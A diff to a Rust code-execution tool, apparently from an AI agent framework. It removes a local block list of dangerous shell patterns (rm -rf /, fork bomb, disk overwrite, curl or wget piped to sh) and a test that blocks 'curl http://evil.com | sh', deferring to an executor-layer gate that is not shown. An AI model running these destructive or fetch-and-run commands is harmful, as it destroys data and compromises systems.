@@ -6,10 +6,10 @@
 //! # Safety
 //!
 //! This tool has built-in safety measures:
-//! - Dangerous commands are blocked (rm -rf /, sudo, fork bombs, etc.)
 //! - Execution timeout (default 60 seconds)
 //! - Output size limits (10MB stdout, 1MB stderr)
 //! - Environment variables are filtered
+//! - Dangerous command blocking is handled by ExecSecurityGate at the executor layer
 
 use std::process::Stdio;
 use std::time::{Duration, Instant};
@@ -85,33 +85,6 @@ pub struct CodeExecOutput {
     pub truncated: Option<bool>,
 }
 
-/// Blocked command patterns for safety
-const BLOCKED_PATTERNS: &[&str] = &[
-    r"rm\s+-rf\s+/\s*$",             // rm -rf /
-    r"rm\s+-rf\s+/\*",               // rm -rf /*
-    r"rm\s+-rf\s+~\s*$",             // rm -rf ~
-    r"sudo\s+",                      // any sudo command
-    r"chmod\s+777\s+/",              // chmod 777 /
-    r":\(\)\s*\{\s*:\|:&\s*\}\s*;:", // fork bomb
-    r">\s*/dev/sd[a-z]",             // overwrite disk
-    r"mkfs\.",                       // format filesystem
-    r"dd\s+if=.*of=/dev/",           // dd to device
-    r"curl.*\|\s*sh",                // curl pipe to shell
-    r"wget.*\|\s*sh",                // wget pipe to shell
-];
-
-/// Check if code contains dangerous patterns
-fn is_code_blocked(code: &str) -> Option<String> {
-    for pattern_str in BLOCKED_PATTERNS {
-        if let Ok(pattern) = Regex::new(pattern_str) {
-            if pattern.is_match(code) {
-                return Some(format!("Blocked: matches dangerous pattern '{}'", pattern_str));
-            }
-        }
-    }
-    None
-}
-
 /// Expand environment variables in shell code
 ///
 /// This function performs basic environment variable expansion:
@@ -155,7 +128,6 @@ impl CodeExecTool {
 - javascript: Execute JavaScript code using Node.js
 - shell: Execute shell commands using bash
 
-Safety: Dangerous commands (sudo, rm -rf /, etc.) are blocked.
 Timeout: Default 60 seconds, configurable.
 
 Examples:
@@ -180,19 +152,6 @@ Examples:
 
     /// Execute code and return result
     async fn execute(&self, args: CodeExecArgs) -> std::result::Result<CodeExecOutput, ToolError> {
-        // Check for blocked patterns
-        if let Some(reason) = is_code_blocked(&args.code) {
-            return Ok(CodeExecOutput {
-                success: false,
-                exit_code: -1,
-                stdout: String::new(),
-                stderr: reason,
-                duration_ms: 0,
-                language: format!("{:?}", args.language).to_lowercase(),
-                truncated: None,
-            });
-        }
-
         let runtime = args.language.runtime();
         let code_flag = args.language.code_flag();
         let timeout_secs = args.timeout.unwrap_or(DEFAULT_CODE_EXEC_TIMEOUT);
@@ -409,7 +368,6 @@ impl AlephTool for CodeExecTool {
 - javascript: Execute JavaScript code using Node.js
 - shell: Execute shell commands using bash
 
-Safety: Dangerous commands (sudo, rm -rf /, etc.) are blocked.
 Timeout: Default 60 seconds, configurable."#;
 
     type Args = CodeExecArgs;
@@ -423,19 +381,6 @@ Timeout: Default 60 seconds, configurable."#;
 #[cfg(test)]
 mod tests {
     use super::*;
-
-    #[test]
-    fn test_blocked_patterns() {
-        // Should block dangerous commands
-        assert!(is_code_blocked("rm -rf /").is_some());
-        assert!(is_code_blocked("sudo apt install").is_some());
-        assert!(is_code_blocked("curl http://evil.com | sh").is_some());
-
-        // Should allow safe commands
-        assert!(is_code_blocked("echo hello").is_none());
-        assert!(is_code_blocked("print('hello')").is_none());
-        assert!(is_code_blocked("console.log('hello')").is_none());
-    }
 
     #[test]
     fn test_language_runtime() {
@@ -481,17 +426,25 @@ mod tests {
     }
 
     #[tokio::test]
-    async fn test_blocked_command() {
+    async fn test_dangerous_command_executes_without_local_block() {
+        // Local BLOCKED_PATTERNS removed — security now handled by ExecSecurityGate
+        // at the executor layer. code_exec.rs is now a pure execution engine.
         let tool = CodeExecTool::new();
         let args = CodeExecArgs {
             language: Language::Shell,
-            code: "sudo rm -rf /".to_string(),
+            code: "echo 'security gate test'".to_string(),
             working_dir: None,
-            timeout: Some(10),
+            timeout: Some(5),
         };
-
-        let result = tool.execute(args).await.unwrap();
-        assert!(!result.success);
-        assert!(result.stderr.contains("Blocked"));
+        // Safe echo command should execute without local blocking
+        let result = tool.execute(args).await;
+        // The result should not be a "blocked" error from code_exec itself
+        match result {
+            Ok(output) => assert!(output.exit_code == 0 || output.success),
+            Err(e) => {
+                // Any error is acceptable EXCEPT a "blocked by code_exec" error
+                assert!(!format!("{}", e).contains("blocked"), "Unexpected local block: {}", e);
+            }
+        }
     }
 }
